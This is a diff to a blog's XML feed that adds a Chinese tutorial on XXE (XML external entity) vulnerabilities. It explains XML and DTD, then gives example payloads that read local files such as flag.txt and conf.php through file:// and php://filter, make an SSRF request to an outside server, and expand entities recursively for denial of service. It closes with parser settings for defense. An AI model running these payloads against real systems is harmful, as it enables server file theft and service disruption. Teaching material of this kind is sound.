@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>XXE漏洞简介</title>
+    <link href="/XXE%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
+    <url>/XXE%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
+    
+    <content type="html"><![CDATA[<p>XML、DTD、XXE简介</p><a id="more"></a><h1 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h1><h2 id="01-XML基础"><a href="#01-XML基础" class="headerlink" title="01 XML基础"></a>01 XML基础</h2><ol><li><strong>简介</strong></li></ol><p>XML，可扩展标记语言，被设计用来传输和存储数据，XML文档形成了一种树结构，它从根部开始，扩展到枝叶，允许创作者定义自己的标签和自己的文档结构</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don't forget me this weekend<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre><p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头</p><p>note为根节点，to,from,heading,body为枝叶节点</p><p>元素是指包括开始标签到包裹结束标签的部分<br>每个元素又可以有对应的属性，XML属性必须加引号</p><ol start="2"><li><strong>语法规则</strong><ul><li>所有XML元素必须有一个关闭标签（HTML未闭合也可以执行）</li><li>XML标签对大小写敏感（HTML中大小写不敏感）</li><li>XML标签必须正确嵌套</li><li>XML属性值必须加引号</li><li>在XML中，空格会被保留</li><li>XML预定义五个实体引用，即用&amp;lt; , &amp;rt; , &amp;amp; , &amp;apos; , &amp;quote;替换 &lt; &gt; &amp; ‘ “</li></ul></li></ol><h2 id="02-DTD"><a href="#02-DTD" class="headerlink" title="02 DTD"></a>02 DTD</h2><ol><li><p><strong>简介</strong></p><p>DTD，文档类型定义，拥有正确语法的XML被称为形式良好的XML，通过DTD验证的XML是合法的XML</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用</p><p>DTD属性声明语法</p><pre><code class="hljs xml-dtd">&lt;!ENTITY 元素名称 属性名称 属性类型 默认值&gt;</code></pre></li><li><p><strong>实例</strong><br><strong>内部引用DTD</strong><br>&lt;!ENTITY entity-name “entity-value”&gt;</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note[    &lt;!ELEMENT note (to,from,heading,body)&gt;        &lt;!ELEMENT to (#PCDATA)&gt;      &lt;!ELEMENT from (#PCDATA)&gt;      &lt;!ELEMENT heading (#PCDATA)&gt;      &lt;!ELEMENT body (#PCDATA)&gt;  ]&gt;&lt;note&gt;  &lt;to&gt;Tove&lt;&#x2F;to&gt;  &lt;from&gt;Jani&lt;&#x2F;from&gt;  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;  &lt;message&gt;Dont forget me this weekend!&lt;&#x2F;message&gt;&lt;&#x2F;note&gt;</code></pre><pre><code class="hljs xml">   note (to,from,heading,body)表示note元素有四个子元素      to (#PCDATA)表示to元素为#PCDATA类型，即被解析的文本，文本中的标签会被当作标记来处理，而实体会被展开,CDATA是字符数据，标签和实体不会被解析      **外部引用DTD**      \<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">entity-name</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"URI/URL"</span>&gt;</span>      ```xml-dtd   <span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>   <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"note.dtd"</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>Dont forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre><p>note.dtd:</p><pre><code class="hljs dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;    &lt;!ELEMENT to (#PCDATA)&gt;  &lt;!ELEMENT from (#PCDATA)&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;  &lt;!ELEMENT body (#PCDATA)&gt;</code></pre></li></ol><h2 id="03-XXE漏洞"><a href="#03-XXE漏洞" class="headerlink" title="03 XXE漏洞"></a>03 XXE漏洞</h2><ol><li><p><strong>原理</strong><br>XXE漏洞，全称XML外部实体注入漏洞</p><p>应用程序解析XML时，进行外部实体的加载，导致可加载恶意外部文件</p><p>XXE漏洞的出发点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤</p><p>XXE漏洞的产生需要两个条件：</p><ul><li>用户能够控制数据的输入</li><li>程序有拼凑的数据</li></ul></li><li><p><strong>协议</strong></p><p>支持的外部协议：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" srcset="/img/loading.gif" alt="img"></p><p>PHP的扩展协议：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" srcset="/img/loading.gif" alt="img"></p></li><li><p><strong>利用</strong></p><ul><li><p>常用协议：</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://文件绝对路径 如：<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span><span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txtphp://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php</code></pre></li></ul><ul><li><p>读取文本文档：</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE  ANY[&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;flag.txt&quot;&gt;]&gt;&lt;value&gt;$xxe;&lt;&#x2F;value&gt;</code></pre><p>服务器即可显示flag.txt中的内容</p></li><li><p>读取PHP文件：</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE  ANY[&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php&quot;&gt;]&gt;&lt;value&gt;$xxe;&lt;&#x2F;value&gt;</code></pre><p>读取php文件需要进行base64的加密，读取之后再进行解密</p></li><li><p>SSRF</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;&quot; [&lt;!ELEMENT data (#ANY)&gt;]&gt;&lt;data&gt;4&lt;&#x2F;data&gt;</code></pre></li><li><p>DoS</p><pre><code class="hljs xml-dtd">&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;&#x2F;data&gt;</code></pre><p>使用了递归的方法</p></li></ul></li><li><p><strong>防御</strong><br>由于libxml2.9.0之后默认不再解析外部实体，XXE漏洞逐渐消亡</p><p>防御方法：</p><ol><li><p>禁用外部实体<br>PHP:</p><pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-keyword">true</span>);</code></pre><p>java:</p><pre><code class="hljs java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="hljs-keyword">false</span>);</code></pre><p>Python:</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="hljs-literal">False</span>))</code></pre></li><li><p>过滤用户的输入，过滤关键字，将实体转义</p></li></ol></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>WEB安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB安全</tag>
+      
+      <tag>XXE</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>同源策略与跨域资源访问</title>
     <link href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE/"/>
     <url>/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE/</url>
@@ -101,9 +128,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>CRLF</tag>
-      
       <tag>XSS</tag>
+      
+      <tag>CRLF</tag>
       
     </tags>
     
